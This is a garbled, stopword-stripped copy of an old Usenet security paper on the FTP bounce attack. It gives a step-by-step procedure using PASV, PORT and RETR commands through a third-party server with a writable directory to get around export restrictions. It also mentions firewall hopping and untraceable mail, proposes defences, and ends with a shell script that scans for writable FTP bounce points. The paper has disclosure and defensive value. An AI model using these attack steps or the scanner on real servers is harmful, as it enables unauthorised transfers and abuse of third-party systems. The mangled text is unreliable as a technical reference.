hobbit hobbit avianorg newsgroups alt subject ftp bounce attack date jul  edt discus one many possible us  ftp server bounce attack  mechanism used probably wellknown date interest detailing fixing seems low nonexistent particular example demonstrates yet another way electronically enforced  export restriction  completely useless trivial bypass chosen effort make reader sit notice really illconceived aspect standard ftp protocol thanks also alain knaff imagfr brief entertaining discussion issue couple month ago got thinking deeply motive  user foreignfr ip address ffff want retrieve cryptographic source code cryptocom u ftp server cryptocom set allow connection deny access crypto source source ip address nonus site near ftp server determine dns case directly retrieve want cryptocom server however cryptocom allow ufrededu download crypto source ufrededu u happen know incoming ufrededu worldwriteable directory anonymous user drop file read back cryptocom ip address cccc attack  assumes ftp server passive mode open ftp connection machine real ip address localhost log change convenient directory write access quote  pasv  quote  stor foobar  take note address port returned pasv command f f f f x x ftp session hang background flip another window something proceed rest construct file containing ftp server command let call file  instrs  look like user ftp pas anonymous cwd exportrestrictedcrypto type port f f f f x x retr cryptotarz quit    f f f f x x address port machine handed first connection trash end extra line create containing null nothing else enough fill k extra data reason filler explained later open ftp connection ufrededu log anonymously cd incoming type following ftp session transfer copy  instrs  file tell ufrededu ftp server connect cryptocom ftp server using file command put instrs quote  port c c c c  quote  retr instrs  cryptotarz show  foobar  machine via first ftp connection connection ufrededu nt die due apparently common server bug clean deleting  instrs  exiting otherwise reconnect finish discussion  several variant pasv listener connection opened machine file write access  another connection ufrededu somewhere completely unrelated fact even ftp server  utility listen known tcp port read raw data file passivemode ftp data connection simply convenient way extra null end command file fill tcp window either end ufred crypto connection ensure command connection stay open long enough whole session executed otherwise ftp server tend abort transfer command processing control connection close prematurely size data enough fill receive transmit window os quite large order k trim know os either end sum default tcp window size split line character avoid overrunning command buffer target server  probably academic since told server quit already cryptocom disallows ftp client connection foreignfr need see file always put  list ar  command file get directory listing entire tree via ufred may retrieve command file target ftp server ascii mode rather binary mode ftp server deal raw newlines others may need command line terminated crlf pair keep mind retrieving file daemon ftp server well possbilities  despite fact thirdparty connection oneway used kind thing similar method used post virtually untraceable mail news hammer server various site fill disk try hop firewall generally annoying hard track time little thought bring realization numerous scary possibility connection launched way come source port site allow firewall effort deal  ftpdata  problem purpose next best thing sourcerouted attack likely succeed source routing fails packet filter made possible way ftp protocol spec written allowing control connection come anywhere data connection go anywhere defense  always site net creaky old ftp server writeable directory allow sort traffic saying  fix ftp server  wrong answer protect thirdparty bouncepoint another one used first obvious thing allow ftp server make data connection host control connection originated prevent attack course since pasv listener could easily ufrededu thus meet requirement prevent site potential bouncepoint also break concept  proxy ftp  hidden somewhere paragraph tiny violin next obvious thing prohibit ftp control connection come reserved port least port prevents scenario stated thing plus usual poop blocking sourcerouted packet avenue spoofery necessary prevent hack sort think whether really need open  incoming  directory allowing passivemode client data connection another possibility still many ftp client use nt passiveaware  loose consensus running code   existing work addressing available avianorg several month might add  fixkits archive  several mod wuftpd presented includes code prevent log attempt use bogus port command recent security fix elsewhere also included along skey support various compiletime option beef security specific application stan barber academcom working merging several fix true updated wuftpd release couple divergent effort going nowhere claimed work complete yet start toward something mind  networkwide release wuftpd contribution around net wuftpd server become popular sad need yet another security upgrade would nice pull improvement together one coordinated place look like happen still wo nt help people insist running vendorsupplied server course sanitychecking client connection source port implemented specifically ftp server fix modification wietses tcpwrappers package since problem general simple port option added denies connection configurable range source port tcpd stage called daemon executed pointed srcfixkitsreadme anonymous ftp area read roadmap grabbing thing note  adding null end command file key making work variety daemon simply sending desired data would usually fail due immediate close signaling daemon bail wustl given entirely whole wuftpd project keeping quiet work bryan oconnor appears many project attend  trivial script find worldwriteable ftpowned directory file unixbased anonymous ftp server surprised many writeable  bouncepoints  pop short run something like later check put get file place server protect uploaded file reading many wonder among week top ten warez site  binsh ftp n foe quote  user ftp  quote  pas nobody  prompt cd dir  ar  xxx bye foe smart enough figure ftp numeric uid passwd file cat v xxx awk begin idir   dirp idir dirp  r   w     ftp dirp  print idir dirp print rm xxx suppose one could call white paper grab avianorg randomftpattack well posted various relevant place h 